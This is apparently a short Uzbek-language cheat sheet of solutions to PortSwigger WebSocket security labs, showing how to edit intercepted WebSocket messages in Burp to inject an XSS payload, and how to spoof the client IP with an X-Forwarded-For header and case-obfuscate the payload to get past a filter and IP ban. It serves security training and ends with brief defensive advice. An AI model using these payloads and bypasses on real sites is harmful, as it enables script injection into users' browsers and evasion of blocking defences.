# WebSockets — PortSwigger LAB yechimlari (cheat sheet)

> Lab host = **example.com**. Burp Proxy → WebSockets history. Message intercept yoqib edit qilasan.

### Manipulating WebSocket messages — APPRENTICE
Chat xabari WebSocket orqali ketadi. Client `<` ni encode qiladi → Burp'da interceptda xom XSS.
```
<img src=1 onerror='alert(1)'>
```
> Forward qilsang alert senda ham, support agentda ham ishlaydi.

### Manipulating the handshake — PRACTITIONER
XSS bloklanadi + IP ban → handshake'ga `X-Forwarded-For` bilan IP spoof + payloadni obfuscate.
```
X-Forwarded-For: 1.1.1.1
```
```
<img src=1 oNeRrOr=alert`1`>
```
> Repeater'da handshake'ga XFF qo'shib reconnect → obfuscated payload yubor.

---

### Eslatma
WebSocket = HTTP'dagi hamma zaiflik (XSS, SQLi, CSWSH). Himoya: input validation server-side,
origin check, handshake'da auth. Umumiy: bu papka README.
